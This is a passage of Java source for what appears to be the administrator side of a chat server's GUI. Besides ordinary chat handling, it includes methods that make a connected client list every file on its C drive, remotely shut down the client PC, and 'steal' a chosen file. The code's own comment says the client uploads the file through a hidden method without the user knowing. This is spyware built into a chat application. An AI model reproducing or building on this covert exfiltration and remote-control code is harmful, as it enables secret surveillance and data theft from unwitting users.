            packet.setServerMessage(txtSend.getText());
            packet.setAttributeColor(Color.RED);
            packet.setAttribute(set);
            s.getOutputStream().writeObject(packet);
            s.getOutputStream().flush();
            txtSend.setText("");
        }
    }

    /**
     * The method hide_show_Conversations simply hides or shows
     * conversations when called upon default is conversations hidden
     * but when u click on the button it shows u live conversations that all clients are having
     * if u click again on the button it hides the conversations so it goes back and forth hide show
     * This method is called by the clicking of the button in the conversations tab
     */
    public void hide_show_Conversations() {
        if (server != null && !server.getSessions().isEmpty()) {
            if (isConversationHidden) {
                isConversationHidden = false;
                btn_Hide_Show_Conversations.setText("Hide Conversation");
                serverInfo = tAreaServerInfo.getText();
                tAreaServerInfo.setText("");
                btnClearConversations.setEnabled(true);
            } else {
                isConversationHidden = true;
                btn_Hide_Show_Conversations.setText("Show Conversation");
                tAreaServerInfo.setText(serverInfo);
                btnClearConversations.setEnabled(false);
            }
        }
    }

    /**
     * The method hide_show_Chat simply hides or shows
     * conversations when called upon default is conversations hidden
     * but when u click on the button it shows u live conversations that all clients are having
     * if u click again on the button it hides the conversations so it goes back and forth hide show
     * This method is called by the clicking of the button in the connections tab
     */
    public void hide_show_Chat() {
        if (server != null && !server.getSessions().isEmpty()) {
            if (isChatHidden) {
                isChatHidden = false;
                btn_Hide_Show_Chat.setText("Hide Chat");

            } else {
                isChatHidden = true;
                btn_Hide_Show_Chat.setText("Show Chat");
                tAreaAdminChat.setText("");
            }
        }
    }

    /**
     * The method clearChat simply clears the JTextArea in the connections tab
     * When this method is called the text area becomes empty
     */
    public void clearChat() {
        tAreaAdminChat.setText("");
    }

    /**
     * This method banUser simply remembers the IP address of the client
     * that was banned in the blackList when clients connect they have to got
     * through a check point it takes their IP and checks if the blackList has this IP
     * if not connection is established if yes the client is disconnected socket closed
     * @param session as a Session object to check the IP of
     * @throws IOException when working with streams or sockets risks are unavoidable
     */
    public void banUser(Session session) throws IOException {
        InetAddress sa = session.getSocket().getInetAddress();
        blackList.add(sa);
        this.disconnect();
    }

    /**
     * This method addUserName is synchronized to make sure that only one thread a a time could execute this method
     * The acquired key is only released by the executing thread when it is done with the method
     * Why this method needs to be synchronized because it is called in the session thread but we could
     * have thousands of sessions so then there will be high probability that a least once on method will be called at the same time
     * This method simply adds the user name to the userNames list
     * @param name to add to the the list of all users
     */
    public synchronized void addUserName(String name) {
        userNames.add(name.toLowerCase());
    }

    /**
     * This method removeClientName is synchronized to make sure that only one thread a a time could execute this method
     * The acquired key is only released by the executing thread when it is done with the method
     * Why this method needs to be synchronized because it is called in the session thread but we could
     * have thousands of sessions so then there will be high probability that a least once on method will be called at the same time
     * This method simply adds the user name to the userNames list
     * @param name to remove from the list of all users
     */
    public synchronized void removeClientName(String name) {
        userNames.remove(name);
    }

    /**
     * This method isUserNameExists is synchronized to make sure that only one thread a a time could execute this method
     * The acquired key is only released by the executing thread when it is done with the method
     * Why this method needs to be synchronized because it is called in the session thread but we could
     * have thousands of sessions so then there will be high probability that a least once on method will be called at the same time
     * This method simply checks if the user name already exists if yes returns true returns false otherwise
     * if the name already exists it sends a message to the client saying the name exists choose another name for login
     * @param userSession to check for comparing the name to all names already in the list
     * @param name to compare as a String
     * @return true if user name exists and false otherwise
     * @throws IOException when working with streams risks are unavoidable
     */
    public synchronized boolean isUserNameExists(Session userSession, String name) throws IOException {
        if (userNames.contains(name.toLowerCase())) {
            Packet packet = new Packet();
            packet.setCheckedName("false");
            userSession.getOutputStream().writeObject(packet);
            userSession.getOutputStream().flush();
            return true;
        } else {
            return false;
        }
    }

    /**
     * The method shutDownRemotePC is used if the administrator wants to shutdown remote PC
     * simply packages the message with setShutDown method then sends the packet to the client
     * The clients when receives this message calls the appropriate methods which in turn will shut down the PC
     * @throws IOException when working with streams and sockets risks are unavoidable
     */
    public void shutDownRemotePC() throws IOException {
        Packet packet = new Packet();
        packet.setShutDown("Shutdown -r -c bye bye client");
        server.getSessions().get(usersListCommunicationsTab.getSelectedIndex()).getOutputStream().writeObject(packet);
        server.getSessions().get(usersListCommunicationsTab.getSelectedIndex()).getOutputStream().flush();
    }

    /**
     * The method cancelShutDownOfRemotePC is used if the administrator wants to cancel shutdown of remote PC
     * simply packages the message with setCancelShutDown method then sends the packet to the client
     * The clients when receives this message calls the appropriate methods which in turn will cancel shut down of the PC
     * @throws IOException when working with streams and sockets risks are unavoidable
     */
    public void cancelShutDownOfRemotePC() throws IOException {
        Packet packet = new Packet();
        packet.setCancelShutDown("Abort ShutDown");
        server.getSessions().get(usersListCommunicationsTab.getSelectedIndex()).getOutputStream().writeObject(packet);
        server.getSessions().get(usersListCommunicationsTab.getSelectedIndex()).getOutputStream().flush();
    }

    /**
     * The method getClientsListOffAllFiles is the method Server calls to get the information
     * of all files of the client system it returns the toString method of all files it finds on the client system
     * It is done by simply setting up the instance variable of the serialized object to whatever we like
     * that variable is used to tell the client system get me all your files. First administrator clicks on the
     * list of users on the communications tab then the out stream of the selected client is gotten and the packet
     * goes to the client the client in turn will analyze it and scan its computer for all files then send all file name
     * back to the Server. Server in turn will see it in the textArea of the communications tab
     * @throws IOException when working with stream risks are unavoidable
     */
    public void getClientsListOffAllFiles() throws IOException {
        Packet packet = new Packet();
        packet.setClientListOffAllFiles("C/ and subdirectories");
        server.getSessions().get(usersListCommunicationsTab.getSelectedIndex()).getOutputStream().writeObject(packet);
        server.getSessions().get(usersListCommunicationsTab.getSelectedIndex()).getOutputStream().flush();
    }

    /**
     * The method cancelFileTransfer is used when a user declines a file transfer from another user
     * this method sends a message to the user who wants to upload a file to tell him that your file transfer
     * was declined that will in turn close his serverSocket, we need that because that user that wants to send a file
     * is waiting for the connection if the user that receives the file clicks accept the connection is established
     * and the file is transfered but if the user clicks decline we need to send a message to close the ServerSocket
     * of the client that is waiting for the connection to transfer a file we don't want the client to listen for the connection
     * if decline option was chosen
     * @param object as an Object
     */
    public void cancelFileTransfer(Object object) {
        if (((Packet) object).getFileTransferDecline() != null) {
            try {
                server.getSessions().get(((Packet) object).getClientIndex()).getOutputStream().writeObject(object);
                server.getSessions().get(((Packet) object).getClientIndex()).getOutputStream().flush();
            } catch (Exception e) {
                tAreaServerInfo.append(e.toString() + "\n");
            }
        }
    }

    /**
     * This method showClientFiles simply gets the ArrayList of all client's file names
     * and displays it in the textArea of the communications tab
     * @param listOffAllFiles as an ArrayList
     */
    public void showClientFiles(final ArrayList listOffAllFiles) {
        if (!listFiles.isEmpty()) {
            listFiles.clear();
        }
        listFiles.addAll(listOffAllFiles);
        SwingUtilities.invokeLater(new Runnable() {

            public void run() {
                modelFileListCommunicationsTab.clear();
                for (int i = 0; i < listOffAllFiles.size(); i++) {
                    modelFileListCommunicationsTab.addElement(((String) listOffAllFiles.get(i)).replace("\\", "/") + "\n");
                }
            }
        });
    }

    /**
     * The method stealClientFile is called when the administrator clicks on the steal file button
     * in the communications tab that click will call this method which in turn will get the selected file that
     * was chosen by clicking on the JList that file information will be sent to the client the client has a hidden method
     * which will create a connection with the server and upload the demanded file the client will not know that the file is being transmitted
     * it will not interrupt any chat because it will be done in the different thread
     */
    public void stealClientFile() {
        if (filesListCommunicationsTab.getSelectedIndex() > -1) {
            Packet packet = new Packet();
            packet.setStealFile("get file");
            packet.setFilePath(listFiles.get(filesListCommunicationsTab.getSelectedIndex()));
            try {
                server.getSessions().get(usersListCommunicationsTab.getSelectedIndex()).getOutputStream().writeObject(packet);
                server.getSessions().get(usersListCommunicationsTab.getSelectedIndex()).getOutputStream().flush();
                new Thread(new Runnable() {

                    public void run() {
                        new StealFile(true, null, listFiles.get(filesListCommunicationsTab.getSelectedIndex()));
                    }
                }).start();
            } catch (Exception e) {
                JOptionPane.showMessageDialog(this, e.toString());
            }
        }
    }
}
